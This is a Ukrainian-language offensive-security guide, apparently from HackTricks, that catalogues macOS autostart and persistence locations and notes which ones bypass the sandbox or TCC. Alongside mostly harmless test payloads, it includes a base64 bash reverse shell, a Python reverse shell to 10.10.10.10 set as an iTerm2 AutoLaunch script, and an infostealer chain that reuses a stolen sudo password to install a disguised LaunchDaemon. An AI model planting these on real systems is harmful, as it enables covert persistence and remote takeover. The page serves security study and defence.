# Автозапуск macOS

{{#include ../banners/hacktricks-training.md}}

Цей розділ значною мірою ґрунтується на серії публікацій у блозі [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Мета полягає в тому, щоб додати **більше локацій автозапуску** (якщо можливо), вказати, **які техніки досі працюють** у найновішій версії macOS (13.4), а також зазначити необхідні **дозволи**.

## Обхід Sandbox

> [!TIP]
> Тут ви знайдете локації запуску, корисні для **обходу sandbox**, які дають змогу просто виконати щось, **записавши це у файл** і **дочекавшись** дуже **поширеної** **дії**, визначеного **проміжку часу** або **дії, яку зазвичай можна виконати** із sandbox без потреби в root-дозволах.

### Launchd

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Локації

- **`/Library/LaunchAgents`**
- **Тригер**: Перезавантаження
- Потрібен root
- **`/Library/LaunchDaemons`**
- **Тригер**: Перезавантаження
- Потрібен root
- **`/System/Library/LaunchAgents`**
- **Тригер**: Перезавантаження
- Потрібен root
- **`/System/Library/LaunchDaemons`**
- **Тригер**: Перезавантаження
- Потрібен root
- **`~/Library/LaunchAgents`**
- **Тригер**: Повторний вхід
- **`~/Library/LaunchDemons`**
- **Тригер**: Повторний вхід

> [!TIP]
> Цікавий факт: **`launchd`** має вбудований property list у Mach-o-секції `__Text.__config`, який містить інші добре відомі сервіси, що `launchd` має запускати. Крім того, ці сервіси можуть містити `RequireSuccess`, `RequireRun` і `RebootOnSuccess`, що означає: вони мають бути запущені та успішно завершити роботу.
>
> Звісно, його не можна змінити через code signing.

#### Опис і експлуатація

**`launchd`** — це **перший** **процес**, який виконується ядром OX S під час запуску, і останній, який завершується під час вимкнення. Він завжди повинен мати **PID 1**. Цей процес **зчитує та виконує** конфігурації, зазначені в **ASEP** **plist-файлах**, у таких локаціях:

- `/Library/LaunchAgents`: агенти для кожного користувача, встановлені адміністратором
- `/Library/LaunchDaemons`: загальносистемні daemons, встановлені адміністратором
- `/System/Library/LaunchAgents`: агенти для кожного користувача, надані Apple.
- `/System/Library/LaunchDaemons`: загальносистемні daemons, надані Apple.

Коли користувач входить у систему, plist-файли, розташовані в `/Users/$USER/Library/LaunchAgents` і `/Users/$USER/Library/LaunchDemons`, запускаються з **дозволами користувача, який увійшов у систему**.

**Основна відмінність між agents і daemons полягає в тому, що agents завантажуються під час входу користувача в систему, а daemons — під час запуску системи** (оскільки існують такі сервіси, як ssh, які потрібно виконати до того, як будь-який користувач отримає доступ до системи). Також agents можуть використовувати GUI, тоді як daemons мають працювати у фоновому режимі.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Бувають випадки, коли **agent потрібно запустити до входу користувача в систему**, такі агенти називаються **PreLoginAgents**. Наприклад, це корисно для забезпечення допоміжних технологій на екрані входу. Їх також можна знайти в `/Library/LaunchAgents`(див. [**тут**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) приклад).

> [!TIP]
> Нові конфігураційні файли Daemons або Agents будуть **завантажені після наступного перезавантаження або за допомогою** `launchctl load <target.plist>` Також **можна завантажувати .plist-файли без цього розширення** за допомогою `launchctl -F <file>` (однак такі plist-файли не завантажуватимуться автоматично після перезавантаження).\
> Також їх можна **вивантажити** за допомогою `launchctl unload <target.plist>` (процес, на який він указує, буде завершено),
>
> Щоб **переконатися, що ніщо** (наприклад, override) **не перешкоджає** **Agent** або **Daemon** **запуститися**, виконайте: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Перелік усіх agents і daemons, завантажених поточним користувачем:
```bash
launchctl list
```
#### Приклад шкідливого ланцюжка LaunchDaemon (повторне використання пароля)

Нещодавній macOS infostealer повторно використав **перехоплений пароль sudo**, щоб створити user agent і root LaunchDaemon:

- Записати цикл agent у `~/.agent` і зробити його виконуваним.
- Створити plist у `/tmp/starter`, який указує на цей agent.
- Повторно використати викрадений пароль із `sudo -S`, щоб скопіювати його до `/Library/LaunchDaemons/com.finder.helper.plist`, встановити власника `root:wheel` і завантажити його за допомогою `launchctl load`.
- Тихо запустити agent через `nohup ~/.agent >/dev/null 2>&1 &`, щоб від’єднати вивід.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Якщо plist належить користувачу, навіть якщо він знаходиться в загальносистемних папках daemon, **завдання буде виконано від імені користувача**, а не root. Це може запобігти деяким атакам підвищення привілеїв.

#### Більше інформації про launchd

**`launchd`** — це **перший** процес у user mode, який запускається з **kernel**. Запуск процесу має бути **успішним**, і він **не може завершитися або аварійно завершити роботу**. Він навіть **захищений** від деяких **сигналів kill**.

Однією з перших дій, які виконує `launchd`, є **запуск** усіх **daemons**, таких як:

- **Timer daemons**, що запускаються у визначений час:
- atd (`com.apple.atrun.plist`): має `StartInterval` 30 хвилин
- crond (`com.apple.systemstats.daily.plist`): має `StartCalendarInterval` для запуску о 00:15
- **Network daemons**, такі як:
- `org.cups.cups-lpd`: прослуховує TCP (`SockType: stream`) із `SockServiceName: printer`
- SockServiceName має бути або портом, або service із `/etc/services`
- `com.apple.xscertd.plist`: прослуховує TCP на порту 1640
- **Path daemons**, які запускаються, коли вказаний path змінюється:
- `com.apple.postfix.master`: перевіряє path `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: у записі `MachServices` вказує ім'я `com.apple.xscertd.helper`
- **UserEventAgent:**
- Це відрізняється від попереднього випадку. Він змушує launchd запускати apps у відповідь на певну подію. Однак у цьому випадку основним binary є не `launchd`, а `/usr/libexec/UserEventAgent`. Він завантажує plugins із SIP restricted folder /System/Library/UserEventPlugins/, де кожен plugin вказує свій initialiser у key `XPCEventModuleInitializer` або, у старіших plugins, у dict `CFPluginFactories` під key `FB86416D-6164-2070-726F-70735C216EC0` свого `Info.plist`.

### Файли запуску shell

Матеріал: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Матеріал (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Але потрібно знайти app із TCC bypass, яка запускає shell, що завантажує ці files

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: відкриття terminal із zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: відкриття terminal із zsh
- Потрібен root
- **`~/.zlogout`**
- **Trigger**: вихід із terminal із zsh
- **`/etc/zlogout`**
- **Trigger**: вихід із terminal із zsh
- Потрібен root
- Потенційно більше інформації у: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: відкриття terminal із bash
- `/etc/profile` (не спрацював)
- `~/.profile` (не спрацював)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: очікується запуск із xterm, але він **не встановлений**, і навіть після встановлення виникає така помилка: xterm: `DISPLAY is not set`

#### Опис та Exploitation

Під час ініціалізації shell environment, такого як `zsh` або `bash`, **виконуються певні startup files**. Наразі macOS використовує `/bin/zsh` як shell за замовчуванням. Цей shell автоматично запускається, коли відкривається Terminal app або коли до device отримують доступ через SSH. Хоча `bash` і `sh` також присутні в macOS, для їх використання їх потрібно запускати явно.

Man page для zsh, яку можна прочитати за допомогою **`man zsh`**, містить детальний опис startup files.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Повторно відкриті застосунки

> [!CAUTION]
> Налаштування вказаної експлуатації, вихід із системи та повторний вхід або навіть перезавантаження не допомогли мені запустити app. (App не запускався; можливо, він має бути запущений під час виконання цих дій)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Тригер**: повторне відкриття застосунків після перезапуску

#### Опис і експлуатація

Усі застосунки, які потрібно повторно відкрити, містяться у plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Отже, щоб під час повторного відкриття запускався ваш app, потрібно лише **додати app до списку**.

UUID можна знайти, переглянувши цей каталог, або за допомогою `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Щоб перевірити застосунки, які буде повторно відкрито, можна виконати:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Щоб **додати застосунок до цього списку**, можна скористатися:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Налаштування Terminal

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Використання Terminal для отримання FDA permissions користувача

#### Розташування

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Відкрити Terminal

#### Опис та Exploitation

У **`~/Library/Preferences`** зберігаються налаштування користувача для Applications. Деякі з цих налаштувань можуть містити конфігурацію для **виконання інших applications/scripts**.

Наприклад, Terminal може виконувати команду під час Startup:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ця конфігурація відображається у файлі **`~/Library/Preferences/com.apple.Terminal.plist`** таким чином:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Отже, якщо plist налаштувань Terminal у системі можна перезаписати, функціональність **`open`** можна використати, щоб **відкрити Terminal, і цю команду буде виконано**.

Це можна додати з CLI за допомогою:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Використання Terminal для отримання FDA permissions користувача

#### Location

- **Anywhere**
- **Trigger**: Відкрити Terminal

#### Description & Exploitation

Якщо ви створите [**`.terminal` script**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) і відкриєте його, **Terminal application** буде автоматично запущено для виконання зазначених у ньому команд. Якщо застосунок Terminal має певні спеціальні привілеї (наприклад, TCC), ваша команда буде виконана з цими спеціальними привілеями.

Спробуйте це за допомогою:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Ви також можете використовувати розширення **`.command`**, **`.tool`** зі звичайним вмістом shell scripts — вони також відкриватимуться через Terminal.

> [!CAUTION]
> Якщо Terminal має **Full Disk Access**, він зможе виконати цю дію (зверніть увагу, що виконана команда буде видима у вікні Terminal).

### Аудіоплагіни

Опис: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Опис: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Ви можете отримати додатковий доступ TCC

#### Розташування

- **`/Library/Audio/Plug-Ins/HAL`**
- Потрібні права root
- **Тригер**: перезапустити coreaudiod або комп’ютер
- **`/Library/Audio/Plug-ins/Components`**
- Потрібні права root
- **Тригер**: перезапустити coreaudiod або комп’ютер
- **`~/Library/Audio/Plug-ins/Components`**
- **Тригер**: перезапустити coreaudiod або комп’ютер
- **`/System/Library/Components`**
- Потрібні права root
- **Тригер**: перезапустити coreaudiod або комп’ютер

#### Опис

Згідно з попередніми описами, можна **скомпілювати деякі аудіоплагіни** та завантажити їх.

### Плагіни QuickLook

Опис: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Ви можете отримати додатковий доступ TCC

#### Розташування

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Опис і експлуатація

Плагіни QuickLook можуть виконуватися, коли ви **запускаєте попередній перегляд файла** (натискаєте пробіл, вибравши файл у Finder), якщо встановлено **плагін із підтримкою цього типу файлів**.

Можна скомпілювати власний плагін QuickLook, розмістити його в одному з попередніх розташувань, щоб завантажити його, а потім перейти до підтримуваного файла й натиснути пробіл для його запуску.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> У мене це не спрацювало — ні з користувацьким LoginHook, ні з root LogoutHook

**Опис**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Ви маєте мати можливість виконати щось на кшталт `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Розташований у `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Вони застаріли, але їх можна використовувати для виконання команд, коли користувач входить у систему.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Це налаштування зберігається у `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Щоб видалити його:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Користувацький root зберігається у **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Тут можна знайти start locations, корисні для **sandbox bypass**, які дають змогу просто виконати щось, **записавши це у файл** та **очікуючи на не надто поширені умови**, як-от встановлення певних **програм, "нетипові" дії користувача** або середовища.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Корисно для sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Однак потрібно мати можливість виконати binary `crontab`
- Або бути root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Для прямого доступу на запис потрібен root. root не потрібен, якщо можна виконати `crontab <file>`
- **Trigger**: Залежить від cron job

#### Description & Exploitation

Перелічити cron jobs **поточного користувача** за допомогою:
```bash
crontab -l
```
Також можна переглянути всі cron jobs користувачів у **`/usr/lib/cron/tabs/`** і **`/var/at/tabs/`** (потрібен root).

У macOS кілька папок, у яких виконуються скрипти з **певною періодичністю**, можна знайти в:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Там можна знайти звичайні **cron** **завдання**, **at** **завдання** (використовуються не дуже часто) і **periodic** **завдання** (переважно використовуються для очищення тимчасових файлів). Щоденні **periodic** **завдання** можна виконати, наприклад, за допомогою: `periodic daily`.

Щоб програмно додати **user cronjob**, можна використати:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 раніше мав надані дозволи TCC

#### Розташування

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Тригер**: Відкриття iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Тригер**: Відкриття iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Тригер**: Відкриття iTerm

#### Опис і експлуатація

Scripts, збережені в **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**, буде виконано. Наприклад:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
або:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Скрипт **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** також буде виконано:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Налаштування iTerm2, розташовані в **`~/Library/Preferences/com.googlecode.iterm2.plist`**, можуть **вказувати команду для виконання** під час відкриття термінала iTerm2.

Цей параметр можна налаштувати в параметрах iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

А команда відображається в налаштуваннях:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Ви можете вказати команду для виконання за допомогою:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Високоймовірно, існують **інші способи зловживання налаштуваннями iTerm2** для виконання довільних команд.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Але xbar має бути встановлено
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
- Запитує дозволи Accessibility

#### Розташування

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Тригер**: Після запуску xbar

#### Опис

Якщо популярну програму [**xbar**](https://github.com/matryer/xbar) встановлено, можна записати shell script у **`~/Library/Application\ Support/xbar/plugins/`**, який буде виконано під час запуску xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Корисний для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Але Hammerspoon має бути встановлений
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
- Запитує дозволи Accessibility

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Після запуску hammerspoon

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) слугує платформою автоматизації для **macOS**, використовуючи **мову програмування LUA** для виконання своїх операцій. Зокрема, він підтримує інтеграцію повного коду AppleScript і виконання shell scripts, що значно розширює його можливості scripting.

Застосунок шукає єдиний файл `~/.hammerspoon/init.lua`, і після запуску script буде виконано.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Корисний для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Але BetterTouchTool має бути встановлений
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Запитує дозволи Automation-Shortcuts та Accessibility

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Цей tool дозволяє вказувати applications або scripts для виконання, коли натискаються певні shortcuts. Зловмисник може налаштувати власні **shortcut та action для виконання в database**, щоб змусити її виконувати довільний code (shortcut може полягати лише в натисканні клавіші).

### Alfred

- Корисний для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Але Alfred має бути встановлений
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Запитує дозволи Automation, Accessibility і навіть Full-Disk access

#### Location

- `???`

Він дозволяє створювати workflows, які можуть виконувати code, коли виконуються певні умови. Потенційно зловмисник може створити workflow file і змусити Alfred завантажити його (для використання workflows потрібно придбати premium version).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Корисний для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Але ssh має бути увімкнено та використовуватися
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH використовує FDA access

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Вхід через ssh
- **`/etc/ssh/sshrc`**
- Потрібні root-права
- **Trigger**: Вхід через ssh

> [!CAUTION]
> Для увімкнення ssh потрібен Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

За замовчуванням, якщо в `/etc/ssh/sshd_config` не вказано `PermitUserRC no`, під час **входу користувача через SSH** будуть виконані scripts **`/etc/ssh/sshrc`** і **`~/.ssh/rc`**.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Корисні для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Але потрібно виконати `osascript` з аргументами
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Вхід
- Exploit payload зберігається з викликом **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Вхід
- Потрібні root-права

#### Description

У System Preferences -> Users & Groups -> **Login Items** можна знайти **items, які виконуються під час входу користувача**.\
Їх можна переглядати, додавати та видаляти з командного рядка:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
These items are stored in the file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** також можуть бути вказані за допомогою API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), який зберігатиме конфігурацію у **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP as Login Item

(Дивіться попередній розділ про Login Items, це розширення)

Якщо зберегти файл **ZIP** як **Login Item**, **`Archive Utility`** відкриє його, і якщо zip-файл, наприклад, зберігався у **`~/Library`** та містив папку **`LaunchAgents/file.plist`** із backdoor, цю папку буде створено (за замовчуванням її немає), а plist буде додано, тому під час наступного входу користувача в систему **backdoor, вказаний у plist, буде виконано**.

Іншим варіантом було б створити файли **`.bash_profile`** і **`.zshenv`** у HOME користувача, тож якщо папка LaunchAgents уже існує, ця техніка все одно працюватиме.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Але потрібно **виконати** **`at`**, і він має бути **увімкнений**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Потрібно **виконати** **`at`**, і він має бути **увімкнений**

#### **Description**

Завдання `at` призначені для **планування одноразових завдань**, які мають бути виконані у визначений час. На відміну від cron jobs, завдання `at` автоматично видаляються після виконання. Важливо зазначити, що ці завдання зберігаються після перезавантаження системи, що за певних умов робить їх потенційною проблемою безпеки.

**За замовчуванням** вони **вимкнені**, але користувач **root** може **увімкнути** **їх** за допомогою:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Це створить файл через 1 годину:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Перевірте чергу завдань за допомогою `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Вище ми бачимо два заплановані завдання. Ми можемо вивести деталі завдання за допомогою `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Якщо AT tasks не увімкнено, створені tasks не виконуватимуться.

**Файли завдань** можна знайти за шляхом `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
